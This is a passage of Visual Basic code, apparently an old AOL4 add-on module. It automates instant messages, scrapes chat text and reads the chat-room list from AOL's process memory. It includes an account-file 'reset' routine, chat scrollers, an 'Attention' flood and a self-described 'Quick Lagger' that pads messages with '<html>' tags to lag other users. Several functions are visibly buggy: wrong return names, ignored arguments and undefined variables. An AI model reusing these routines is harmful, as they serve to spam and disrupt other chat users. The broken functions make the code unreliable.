AOIcon% = FindChildByClass(IMWin%, "_AOL_Icon")
Loop Until AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0
Call SendMEssageByString(AOEdit%, WM_SETTEXT, 0, Recipiant)
Call SendMEssageByString(AORich%, WM_SETTEXT, 0, Message)

For x = 1 To 9
    AOIcon% = GetWindow(AOIcon%, 2)
Next x

Call Timeout(0.01)
ClickIcon (AOIcon%)

Do: DoEvents
Aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(Aol%, "MDIClient")
IMWin% = FindChildByTitle(MDI%, "Send Instant Message")
OkWin% = FindWindow("#32770", "America Online")
If OkWin% <> 0 Then Call SendMessage(OkWin%, WM_CLOSE, 0, 0): closer2 = SendMessage(IMWin%, WM_CLOSE, 0, 0): Exit Do
If IMWin% = 0 Then Exit Do
Loop

End Sub
Sub IMKeyword(Recipiant, Message)

Aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(Aol%, "MDIClient")

Call AOL40_Keyword("aol://9293:")

Do: DoEvents
IMWin% = FindChildByTitle(MDI%, "Send Instant Message")
AOEdit% = FindChildByClass(IMWin%, "_AOL_Edit")
AORich% = FindChildByClass(IMWin%, "RICHCNTL")
AOIcon% = FindChildByClass(IMWin%, "_AOL_Icon")
Loop Until AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0
Call SendMEssageByString(AOEdit%, WM_SETTEXT, 0, Recipiant)
Call SendMEssageByString(AORich%, WM_SETTEXT, 0, Message)

For x = 1 To 9
    AOIcon% = GetWindow(AOIcon%, 2)
Next x

Call Timeout(0.01)
ClickIcon (AOIcon%)

Do: DoEvents
Aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(Aol%, "MDIClient")
IMWin% = FindChildByTitle(MDI%, "Send Instant Message")
OkWin% = FindWindow("#32770", "America Online")
If OkWin% <> 0 Then Call SendMessage(OkWin%, WM_CLOSE, 0, 0): closer2 = SendMessage(IMWin%, WM_CLOSE, 0, 0): Exit Do
If IMWin% = 0 Then Exit Do
Loop

End Sub

Function GetText(child)
GetTrim = sendmessagebynum(child, 14, 0&, 0&)
TrimSpace$ = Space$(GetTrim)
GetString = SendMEssageByString(child, 13, GetTrim + 1, TrimSpace$)
GetText = TrimSpace$
End Function

Function GetChatText()
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")
ChatText = GetText(AORich%)
GetChatText = ChatText
End Function

Function LastChatLineWithSN()
ChatText$ = GetChatText

For FindChar = 1 To Len(ChatText$)

thechar$ = Mid(ChatText$, FindChar, 1)
thechars$ = thechars$ & thechar$

If thechar$ = Chr(13) Then
TheChatText$ = Mid(thechars$, 1, Len(thechars$) - 1)
thechars$ = ""
End If

Next FindChar

lastlen = Val(FindChar) - Len(thechars$)
lastline = Mid(ChatText$, lastlen, Len(thechars$))

LastChatLineWithSN = lastline
End Function

Function SNFromLastChatLine()
ChatText$ = LastChatLineWithSN
ChatTrim$ = Left$(ChatText$, 11)
For z = 1 To 11
    If Mid$(ChatTrim$, z, 1) = ":" Then
        SN = Left$(ChatTrim$, z - 1)
    End If
Next z
SNFromLastChatLine = SN
End Function

Function LastChatLine()
ChatText = LastChatLineWithSN
ChatTrimNum = Len(SNFromLastChatLine)
ChatTrim$ = Mid$(ChatText, ChatTrimNum + 4, Len(ChatText) - Len(SNFromLastChatLine))
LastChatLine = ChatTrim$
End Function

Sub AddRoomToListBox(ListBox As ListBox)
On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long

room = FindChatRoom()
aolhandle = FindChildByClass(room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal person$, 4)
ListPersonHold = ListPersonHold + 6

person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, person$, Len(person$), ReadBytes)

person$ = Left$(person$, InStr(person$, vbNullChar) - 1)
If person$ = UserSN Then GoTo Na
List1.AddItem person$
Na:
Next Index
Call CloseHandle(AOLProcessThread)
End If

End Sub

Sub AddRoomToComboBox(ListBox As ListBox, ComboBox As ComboBox)
Call AddRoomToListBox(ListBox)
For Q = 0 To ListBox.ListCount
    ComboBox.AddItem (ListBox.List(Q))
Next Q
End Sub



Sub FormDance(M As Form)

'  This makes a form dance across the screen
M.Left = 5
Pause (0.1)
M.Left = 400
Pause (0.1)
M.Left = 700
Pause (0.1)
M.Left = 1000
Pause (0.1)
M.Left = 2000
Pause (0.1)
M.Left = 3000
Pause (0.1)
M.Left = 4000
Pause (0.1)
M.Left = 5000
Pause (0.1)
M.Left = 4000
Pause (0.1)
M.Left = 3000
Pause (0.1)
M.Left = 2000
Pause (0.1)
M.Left = 1000
Pause (0.1)
M.Left = 700
Pause (0.1)
M.Left = 400
Pause (0.1)
M.Left = 5
Pause (0.1)
M.Left = 400
Pause (0.1)
M.Left = 700
Pause (0.1)
M.Left = 1000
Pause (0.1)
M.Left = 2000

End Sub
Private Sub InitializeTextBoxSlow()

        
       'This routine assigns the string to the textbox text propert
       '     y
       '     'as the string is being built. This is the method that
       '     'the MS VBKB detailed. I named it InitializeTextBoxSlow.
       Dim i As Integer
       Dim J As Integer
       Text1.Text = ""
       lblStatus = "Performing slow load..."
        
       '     'just a pause to let the textbox and label update

              DoEvents

                            For i% = 1 To 100
                                   Text1.Text = Text1.Text + "This is line " + Str$(i%)
                                    
                                   '     'Add 10 words to a line of text.

                                          For J% = 1 To 10
                                                 Text1.Text = Text1.Text + " ...Word " + Str$(J%)
                                          Next J%

                                    
                                   '     'Force a carriage return and linefeed
                                   '     'VB3 users need to use chr$(13) & chr$(10)
                                   Text1.Text = Text1.Text + vbCrLf
                            Next i%

                     Text1.Text = Text1.Text
              End Sub


Private Sub InitializeTextBoxFast()

        
       'This routine assigns the string to temporary string variabl
       '     e
       '     'as the string is being built.
       Dim tmp As String
       Dim i As Integer
       Dim J As Integer
       Text1.Text = ""
       lblStatus = "Performing fast load..."
        
       '     'just a pause to let the textbox and label update

              DoEvents

                            For i% = 1 To 100
                                   tmp$ = tmp$ + "This is line " + Str$(i%)
                                    
                                   '     'Add 10 words to a line of text

                                          For J% = 1 To 10
                                                 tmp$ = tmp$ + " ...Word " + Str$(J%)
                                          Next J%

                                    
                                   '     'Force a carriage return and linefeed
                                   '     'VB3 users need to use chr$(13) & chr$(10)
                                   tmp$ = tmp$ + vbCrLf
                            Next i%

                      
                     '     'Now it's time to assign it to the text property.
                     Text1.Text = tmp$
                      
              End Sub


Function ScrollText&(TextBox As Control, vLines As Integer)

       Dim Success As Long
       Dim SavedWnd As Long
       Dim r As Long
       Dim Lines As Long
       'save the window handle of the control that currently has fo
       '     cus
       SavedWnd = Screen.ActiveControl.hWnd
       Lines& = vLines
        
       '     'Set the focus to the passed control (text control)
       TextBox.SetFocus
        
       '     'Scroll the lines.
       Success = SendMessageLong(TextBox.hWnd, EM_LINESCROLL, 0, Lines&)
        
       '     'Restore the focus to the original control
       r = PutFocus(SavedWnd)
        
       '     'Return the number of lines actually scrolled
       ScrollText& = Success
End Function

Function RemoveSpace(thetext$)
Dim Text$
Dim theloop%
Text$ = thetext$
For theloop% = 1 To Len(thetext$)
If Mid(Text$, theloop%, 1) = " " Then
Text$ = Left$(Text$, theloop% - 1) + Right$(Text$, Len(Text$) - theloop%)
theloop% = theloop% - 1
End If
Next
RemoveSpace = Text$
End Function


Function RGB2HEX(r, G, b)
Dim x%
Dim XX%
Dim Color%
Dim Divide
Dim Answer%
Dim Remainder%
Dim Configuring$
For x% = 1 To 3
If x% = 1 Then Color% = b
If x% = 2 Then Color% = G
If x% = 3 Then Color% = r
For XX% = 1 To 2
Divide = Color% / 16
Answer% = Int(Divide)
Remainder% = (10000 * (Divide - Answer%)) / 625

If Remainder% < 10 Then Configuring$ = Str(Remainder%) + Configuring$
If Remainder% = 10 Then Configuring$ = "A" + Configuring$
If Remainder% = 11 Then Configuring$ = "B" + Configuring$
If Remainder% = 12 Then Configuring$ = "C" + Configuring$
If Remainder% = 13 Then Configuring$ = "D" + Configuring$
If Remainder% = 14 Then Configuring$ = "E" + Configuring$
If Remainder% = 15 Then Configuring$ = "F" + Configuring$
Color% = Answer%
Next XX%
Next x%
Configuring$ = RemoveSpace(Configuring$)
RGB2HEX = Configuring$
End Function


Sub AOLSetText(win, txt)
thetext% = SendMEssageByString(win, WM_SETTEXT, 0, txt)
End Sub
Sub DoubleClick(Button%)
' |¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯|\
' |This double clicks a button of your choice          | |                                                   | |
' |____________________________________________________| |
'  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\__\|
Dim DoubleClickNow%
DoubleClickNow% = sendmessagebynum(Button%, WM_LBUTTONDBLCLK, &HD, 0)
End Sub
Sub Answerbot()
'steps...
'1. in Timer1 tye Call FortuneBot
'2. make 2 command buttons
'3. in command button 1 type-
'Timer1.enbled = True
'AOLChatSend "Type /fortune to get your fortune"
'4. in the command button 2 type-
'Timer1.enabled = false
'AOLChatSend "Fortune Bot Off!"
FreeProcess
timer1.interval = 1
On Error Resume Next
Dim last As String
Dim name As String
Dim A As String
Dim n As Integer
Dim x As Integer
DoEvents
A = LastChatLine
last = Len(A)
For x = 1 To last
name = Mid(A, x, 1)
Final = Final & name
If name = ":" Then Exit For
Next x
Final = Left(Final, Len(Final) - 1)
If Final = AOLGetUser Then
Exit Sub
Else
If InStr(A, "/Vv KoBe vV") Then
 SendChat (" Don't Waste Time on a Server")
Call Timeout(0.6)
End If
End If
End Sub

Sub ResetNew(SN As String, pth As String)
Screen.MousePointer = 11
Static m0226 As String * 40000
Dim l9E68 As Long
Dim l9E6A As Long
Dim l9E6C As Integer
Dim l9E6E As Integer
Dim l9E70 As Variant
Dim l9E74 As Integer
If UCase$(Trim$(SN)) = "NEWUSER" Then MsgBox ("AOL is already reset to NewUser!"): Exit Sub
On Error GoTo no_reset
If Len(SN) < 7 Then MsgBox ("The Screen Name will not work unless it is at least 7 characters, including spaces"): Exit Sub
tru_sn = "NewUser" + String$(Len(SN) - 7, " ")
Let paath$ = (pth & "\idb\main.idx")
Open paath$ For Binary As #1
l9E68& = 1
l9E6A& = LOF(1)
While l9E68& < l9E6A&
    m0226 = String$(40000, Chr$(0))
    Get #1, l9E68&, m0226
    While InStr(UCase$(m0226), UCase$(SN)) <> 0
        Mid$(m0226, InStr(UCase$(m0226), UCase$(SN))) = tru_sn
    Wend
    
    Put #1, l9E68&, m0226
    l9E68& = l9E68& + 40000
Wend

Seek #1, Len(SN)
l9E68& = Len(SN)
While l9E68& < l9E6A&
m0226 = String$(40000, Chr$(0))
    Get #1, l9E68&, m0226
    While InStr(UCase$(m0226), UCase$(SN)) <> 0
        Mid$(m0226, InStr(UCase$(m0226), UCase$(SN))) = tru_sn
        Wend
    Put #1, l9E68&, m0226
    l9E68& = l9E68& + 40000
Wend
Close #1
Screen.MousePointer = 0
no_reset:
Screen.MousePointer = 0
Exit Sub
Resume Next

End Sub



Function r_elite(strin As String)
'Returns the strin elite
Let inptxt$ = strin
Let lenth% = Len(inptxt$)

Do While numspc% <= lenth%
DoEvents
Let numspc% = numspc% + 1
Let nextChr$ = Mid$(inptxt$, numspc%, 1)
Let nextchrr$ = Mid$(inptxt$, numspc%, 2)
If nextchrr$ = "ae" Then Let nextchrr$ = "æ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If nextchrr$ = "AE" Then Let nextchrr$ = "Æ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If nextchrr$ = "oe" Then Let nextchrr$ = "œ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If nextchrr$ = "OE" Then Let nextchrr$ = "Œ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If Crapp% > 0 Then GoTo Greed

If nextChr$ = "A" Then Let nextChr$ = "Å"
If nextChr$ = "a" Then Let nextChr$ = "å"
If nextChr$ = "B" Then Let nextChr$ = "ß"
If nextChr$ = "C" Then Let nextChr$ = "Ç"
If nextChr$ = "c" Then Let nextChr$ = "¢"
If nextChr$ = "D" Then Let nextChr$ = "Ð"
If nextChr$ = "d" Then Let nextChr$ = "ð"
If nextChr$ = "E" Then Let nextChr$ = "Ê"
If nextChr$ = "e" Then Let nextChr$ = "è"
If nextChr$ = "f" Then Let nextChr$ = "ƒ"
If nextChr$ = "H" Then Let nextChr$ = "h"
If nextChr$ = "I" Then Let nextChr$ = "‡"
If nextChr$ = "i" Then Let nextChr$ = "î"
If nextChr$ = "k" Then Let nextChr$ = "|‹"
If nextChr$ = "K" Then Let nextChr$ = "(«"
If nextChr$ = "L" Then Let nextChr$ = "£"
If nextChr$ = "M" Then Let nextChr$ = "/\/\"
If nextChr$ = "m" Then Let nextChr$ = "‹v›"
If nextChr$ = "N" Then Let nextChr$ = "/\/"
If nextChr$ = "n" Then Let nextChr$ = "ñ"
If nextChr$ = "O" Then Let nextChr$ = "Ø"
If nextChr$ = "o" Then Let nextChr$ = "ö"
If nextChr$ = "P" Then Let nextChr$ = "¶"
If nextChr$ = "p" Then Let nextChr$ = "Þ"
If nextChr$ = "r" Then Let nextChr$ = "®"
If nextChr$ = "S" Then Let nextChr$ = "§"
If nextChr$ = "s" Then Let nextChr$ = "$"
If nextChr$ = "t" Then Let nextChr$ = "†"
If nextChr$ = "U" Then Let nextChr$ = "Ú"
If nextChr$ = "u" Then Let nextChr$ = "µ"
If nextChr$ = "V" Then Let nextChr$ = "\/"
If nextChr$ = "W" Then Let nextChr$ = "\\'"
If nextChr$ = "w" Then Let nextChr$ = "vv"
If nextChr$ = "X" Then Let nextChr$ = "><"
If nextChr$ = "x" Then Let nextChr$ = "×"
If nextChr$ = "Y" Then Let nextChr$ = "¥"
If nextChr$ = "y" Then Let nextChr$ = "ý"
If nextChr$ = "!" Then Let nextChr$ = "¡"
If nextChr$ = "?" Then Let nextChr$ = "¿"
If nextChr$ = "." Then Let nextChr$ = "…"
If nextChr$ = "," Then Let nextChr$ = "‚"
If nextChr$ = "1" Then Let nextChr$ = "¹"
If nextChr$ = "%" Then Let nextChr$ = "‰"
If nextChr$ = "2" Then Let nextChr$ = "²"
If nextChr$ = "3" Then Let nextChr$ = "³"
If nextChr$ = "_" Then Let nextChr$ = "¯"
If nextChr$ = "-" Then Let nextChr$ = "—"
If nextChr$ = " " Then Let nextChr$ = " "
If nextChr$ = "<" Then Let nextChr$ = "«"
If nextChr$ = ">" Then Let nextChr$ = "»"
If nextChr$ = "*" Then Let nextChr$ = "¤"
If nextChr$ = "`" Then Let nextChr$ = "“"
If nextChr$ = "'" Then Let nextChr$ = "”"
If nextChr$ = "0" Then Let nextChr$ = "º"
Let newsent$ = newsent$ + nextChr$

Greed:
If Crapp% > 0 Then Let Crapp% = Crapp% - 1
DoEvents
Loop
r_elite = newsent$

End Function
Function r_elite2(strin As String)
'Returns the strin elite
Let inptxt$ = strin
Let lenth% = Len(inptxt$)

Do While numspc% <= lenth%
DoEvents
Let numspc% = numspc% + 1
Let nextChr$ = Mid$(inptxt$, numspc%, 1)
Let nextchrr$ = Mid$(inptxt$, numspc%, 2)
If nextchrr$ = "ae" Then Let nextchrr$ = "æ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If nextchrr$ = "AE" Then Let nextchrr$ = "Æ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If nextchrr$ = "oe" Then Let nextchrr$ = "œ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If nextchrr$ = "OE" Then Let nextchrr$ = "Œ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If Crapp% > 0 Then GoTo Greed

If nextChr$ = "A" Then Let nextChr$ = "Å"
If nextChr$ = "a" Then Let nextChr$ = "ã"
If nextChr$ = "B" Then Let nextChr$ = "(3"
If nextChr$ = "C" Then Let nextChr$ = "Ç"
If nextChr$ = "c" Then Let nextChr$ = "¢"
If nextChr$ = "D" Then Let nextChr$ = "|)"
If nextChr$ = "d" Then Let nextChr$ = "ð"
If nextChr$ = "E" Then Let nextChr$ = "Ê"
If nextChr$ = "e" Then Let nextChr$ = "è"
If nextChr$ = "f" Then Let nextChr$ = "ƒ"
If nextChr$ = "H" Then Let nextChr$ = "h"
If nextChr$ = "I" Then Let nextChr$ = "‡"
If nextChr$ = "i" Then Let nextChr$ = "î"
If nextChr$ = "k" Then Let nextChr$ = "|‹"
If nextChr$ = "K" Then Let nextChr$ = "(«"
If nextChr$ = "L" Then Let nextChr$ = "£"
If nextChr$ = "M" Then Let nextChr$ = "/\/\"
If nextChr$ = "m" Then Let nextChr$ = "‹v›"
If nextChr$ = "N" Then Let nextChr$ = "/\/"
If nextChr$ = "n" Then Let nextChr$ = "ñ"
If nextChr$ = "O" Then Let nextChr$ = "Ø"
If nextChr$ = "o" Then Let nextChr$ = "ö"
If nextChr$ = "P" Then Let nextChr$ = "¶"
If nextChr$ = "p" Then Let nextChr$ = "Þ"
If nextChr$ = "r" Then Let nextChr$ = "®"
If nextChr$ = "S" Then Let nextChr$ = "§"
If nextChr$ = "s" Then Let nextChr$ = "$"
If nextChr$ = "t" Then Let nextChr$ = "†"
If nextChr$ = "U" Then Let nextChr$ = "Ú"
If nextChr$ = "u" Then Let nextChr$ = "µ"
If nextChr$ = "V" Then Let nextChr$ = "\/"
If nextChr$ = "W" Then Let nextChr$ = "\\'"
If nextChr$ = "w" Then Let nextChr$ = ""
If nextChr$ = "X" Then Let nextChr$ = "><"
If nextChr$ = "x" Then Let nextChr$ = "×"
If nextChr$ = "Y" Then Let nextChr$ = "¥"
If nextChr$ = "y" Then Let nextChr$ = "ý"
If nextChr$ = "!" Then Let nextChr$ = "¡"
If nextChr$ = "?" Then Let nextChr$ = "¿"
If nextChr$ = "." Then Let nextChr$ = "…"
If nextChr$ = "," Then Let nextChr$ = "‚"
If nextChr$ = "1" Then Let nextChr$ = "¹"
If nextChr$ = "%" Then Let nextChr$ = "‰"
If nextChr$ = "2" Then Let nextChr$ = "²"
If nextChr$ = "3" Then Let nextChr$ = "³"
If nextChr$ = "_" Then Let nextChr$ = "¯"
If nextChr$ = "-" Then Let nextChr$ = "—"
If nextChr$ = " " Then Let nextChr$ = " "
If nextChr$ = "<" Then Let nextChr$ = "«"
If nextChr$ = ">" Then Let nextChr$ = "»"
If nextChr$ = "*" Then Let nextChr$ = "¤"
If nextChr$ = "`" Then Let nextChr$ = "“"
If nextChr$ = "'" Then Let nextChr$ = "”"
If nextChr$ = "0" Then Let nextChr$ = "º"
Let newsent$ = newsent$ + nextChr$

Greed:
If Crapp% > 0 Then Let Crapp% = Crapp% - 1
DoEvents
Loop
SendChat newsent$

End Function


Function r_dots(strin As String)
'Returns the strin spaced
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextChr$ = Mid$(inptxt$, numspc%, 1)
Let nextChr$ = nextChr$ + "•"
Let newsent$ = newsent$ + nextChr$
Loop
r_dots = newsent$

End Function


Function r_backwards(strin As String)
'Returns the strin backwards
Let inptxt$ = Text3
Let lenth% = Len(Text3)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextChr$ = Mid$(Text3, numspc%, 1)
Let newsent$ = nextChr$ & newsent$
Loop
text2.AddItem newsent$

End Function

Function r_hacker(strin As String)
'Returns the strin hacker style
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextChr$ = Mid$(inptxt$, numspc%, 1)
If nextChr$ = "A" Then Let nextChr$ = "a"
If nextChr$ = "E" Then Let nextChr$ = "e"
If nextChr$ = "I" Then Let nextChr$ = "i"
If nextChr$ = "O" Then Let nextChr$ = "o"
If nextChr$ = "U" Then Let nextChr$ = "u"
If nextChr$ = "b" Then Let nextChr$ = "B"
If nextChr$ = "c" Then Let nextChr$ = "C"
If nextChr$ = "d" Then Let nextChr$ = "D"
If nextChr$ = "z" Then Let nextChr$ = "Z"
If nextChr$ = "f" Then Let nextChr$ = "F"
If nextChr$ = "g" Then Let nextChr$ = "G"
If nextChr$ = "h" Then Let nextChr$ = "H"
If nextChr$ = "y" Then Let nextChr$ = "Y"
If nextChr$ = "j" Then Let nextChr$ = "J"
If nextChr$ = "k" Then Let nextChr$ = "K"
If nextChr$ = "l" Then Let nextChr$ = "L"
If nextChr$ = "m" Then Let nextChr$ = "M"
If nextChr$ = "n" Then Let nextChr$ = "N"
If nextChr$ = "x" Then Let nextChr$ = "X"
If nextChr$ = "p" Then Let nextChr$ = "P"
If nextChr$ = "q" Then Let nextChr$ = "Q"
If nextChr$ = "r" Then Let nextChr$ = "R"
If nextChr$ = "s" Then Let nextChr$ = "S"
If nextChr$ = "t" Then Let nextChr$ = "T"
If nextChr$ = "w" Then Let nextChr$ = "W"
If nextChr$ = "v" Then Let nextChr$ = "V"
If nextChr$ = "?" Then Let nextChr$ = "¿"
If nextChr$ = " " Then Let nextChr$ = " "
If nextChr$ = "]" Then Let nextChr$ = "]"
If nextChr$ = "[" Then Let nextChr$ = "["
Let newsent$ = newsent$ + nextChr$
Loop
r_hacker = newsent$

End Function
Sub r_kahn()
Dim Firstletter, LastLetter, Middle
txtlen = Len(txt)
Firstletter = Left$(txt, 1)
LastLetter = Right$(txt, 1)
Middle = NotSure
withnofirst = Right$(txt, txtlen - 1)
nofirstlen = Len(withnofirst)
Withnofirstorlast = Left$(withnofirst, nofirstlen - 1)
Text_Encode = LastLetter & Withnofirstorlast & Firstletter
End Sub
Function r_link(strin As String)
'Returns the strin spaced
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextChr$ = Mid$(inptxt$, numspc%, 1)
Let nextChr$ = nextChr$ + "—"
Let newsent$ = newsent$ + nextChr$
Loop
r_link = newsent$

End Function

Function r_html(strin As String)
'Returns the strin lagged
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextChr$ = Mid$(inptxt$, numspc%, 1)
Let nextChr$ = nextChr$ + "<html>"
Let newsent$ = newsent$ + nextChr$
Loop
r_html = newsent$

End Function

Function r_spaced(strin As String)
'Returns the strin spaced
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextChr$ = Mid$(inptxt$, numspc%, 1)
Let nextChr$ = nextChr$ + " "
Let newsent$ = newsent$ + nextChr$
Loop
r_spaced = newsent$

End Function
Public Sub AOLScrollList(Lst As ListBox)
For x% = 0 To List1.ListCount - 1
SendChat ("Scrolling Name [" & x% & "]" & List1.List(x%))
Timeout (0.75)
Next x%
End Sub
Sub WavyChatBlueBlack(thetext)
G$ = thetext
A = Len(G$)
For W = 1 To A Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#F0" & Chr$(34) & "><sub>" & S$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & T$
Next W
SendChat (p$)
End Sub

Sub EliteTalker(Word$)
Made$ = ""
For Q = 1 To Len(Word$)
    letter$ = ""
    letter$ = Mid$(Word$, Q, 1)
    leet$ = ""
    x = Int(Rnd * 3 + 1)
    If letter$ = "a" Then
    If x = 1 Then leet$ = "â"
    If x = 2 Then leet$ = "å"
    If x = 3 Then leet$ = "ä"
    End If
    If letter$ = "b" Then leet$ = "b"
    If letter$ = "c" Then leet$ = "ç"
    If letter$ = "d" Then leet$ = "d"
    If letter$ = "e" Then
    If x = 1 Then leet$ = "ë"
    If x = 2 Then leet$ = "ê"
    If x = 3 Then leet$ = "é"
    End If
    If letter$ = "i" Then
    If x = 1 Then leet$ = "ì"
    If x = 2 Then leet$ = "ï"
    If x = 3 Then leet$ = "î"
    End If
    If letter$ = "j" Then leet$ = ",j"
    If letter$ = "n" Then leet$ = "ñ"
    If letter$ = "o" Then
    If x = 1 Then leet$ = "ô"
    If x = 2 Then leet$ = "ð"
    If x = 3 Then leet$ = "õ"
    End If
    If letter$ = "s" Then leet$ = "š"
    If letter$ = "t" Then leet$ = "†"
    If letter$ = "u" Then
    If x = 1 Then leet$ = "ù"
    If x = 2 Then leet$ = "û"
    If x = 3 Then leet$ = "ü"
    End If
    If letter$ = "w" Then leet$ = "vv"
    If letter$ = "y" Then leet$ = "ÿ"
    If letter$ = "0" Then leet$ = "Ø"
    If letter$ = "A" Then
    If x = 1 Then leet$ = "Å"
    If x = 2 Then leet$ = "Ä"
    If x = 3 Then leet$ = "Ã"
    End If
    If letter$ = "B" Then leet$ = "ß"
    If letter$ = "C" Then leet$ = "Ç"
    If letter$ = "D" Then leet$ = "Ð"
    If letter$ = "E" Then leet$ = "Ë"
    If letter$ = "I" Then
    If x = 1 Then leet$ = "Ï"
    If x = 2 Then leet$ = "Î"
    If x = 3 Then leet$ = "Í"
    End If
    If letter$ = "N" Then leet$ = "Ñ"
    If letter$ = "O" Then leet$ = "Õ"
    If letter$ = "S" Then leet$ = "Š"
    If letter$ = "U" Then leet$ = "Û"
    If letter$ = "W" Then leet$ = "VV"
    If letter$ = "Y" Then leet$ = "Ý"
    If letter$ = "`" Then leet$ = "´"
    If letter$ = "!" Then leet$ = "¡"
    If letter$ = "?" Then leet$ = "¿"
    If Len(leet$) = 0 Then leet$ = letter$
    Made$ = Made$ & leet$
Next Q
SendChat (Made$)
End Sub

Sub IMsOn()
Call IMKeyword("$IM_ON", " ")
End Sub
Sub IMsOff()
Call IMKeyword("$IM_OFF", " ")
End Sub

Sub MyASCII(PPP$)
G$ = WavY("ChAoS'§ Quick Lagger 4 AOL4 ")
L$ = WavY(" by ChAoS")
lo$ = WavY(PPP$ & "Loaded")
b$ = WavY("User: " & UserSN)
TI$ = CoLoRChaTBlueBlack(TrimTime)
V$ = CoLoRChaTBlueBlack("²·º")
FONTTT$ = "<FONT FACE=" & Chr$(34) & "ARIAL" & Chr$(34) & ">"
SendChat (FONTTT$ & "<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & ">" & "‹›·´¯`·._.·• " & G$ & V$ & L$ & "<FONT COLOR=" & Chr$(34) & "#0" & Chr$(34) & "> • " & lo$ & "<FONT COLOR=" & Chr$(34) & "#0" & Chr$(34) & "> •")
Call Timeout(0.15)
SendChat (FONTTT$ & "<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & ">" & "‹›·´¯`·._.·• " & b$ & "<FONT COLOR=" & Chr$(34) & "#0" & Chr$(34) & "> •" & TI$ & "<FONT COLOR=" & Chr$(34) & "#0" & Chr$(34) & "> • ")
End Sub

Function WavYChaTRedGreen(thetext As String)
G$ = thetext
A = Len(G$)
For W = 1 To A Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#006400" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sub>" & S$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#006400" & Chr$(34) & ">" & T$
Next W
WavYChaTRG = p$
End Function
Function WavYChaTRedBlue(thetext As String)
G$ = thetext
A = Len(G$)
For W = 1 To A Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sub>" & S$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & T$
Next W
WavYChaTRB = p$
End Function

Sub Attention(thetext As String)
G$ = WavY("Nike Toolz for AOL4 ")
L$ = WavY(" by VB4 & Nike")
aa$ = WavY("Attention")
SendChat ("$AOLame4$ ATTENTION $AOLame4$")
Call Timeout(0.15)
SendChat (Text1.Text)
Call Timeout(0.15)
SendChat ("$AOLame4$ ATTENTION $AOLame4$")
Call Timeout(0.15)
